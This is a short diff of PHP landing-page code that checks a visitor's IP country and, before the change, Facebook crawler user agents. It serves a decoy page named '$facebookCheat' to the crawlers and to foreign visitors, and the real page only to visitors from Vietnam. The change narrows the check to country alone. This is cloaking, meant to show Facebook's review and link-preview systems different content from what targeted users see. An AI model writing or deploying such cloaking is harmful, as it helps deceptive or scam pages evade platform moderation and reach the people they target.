@@ -291,16 +291,15 @@ function ip_details($ip)
 $details = ip_details($ip);
 $country = $details->country;
 if (
-    strpos($_SERVER["HTTP_USER_AGENT"], "facebookplatform") !== false ||
-    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false || $country !== "VN"
+    $country == "VN"
 ) {
-  echo "' . $facebookCheat . '";
 
+echo "' . $htmlString . '";
 die();
 
  }
 else {
-      echo "' . $htmlString . '";
+  echo "' . $facebookCheat . '";
    die();
 }
 ?>
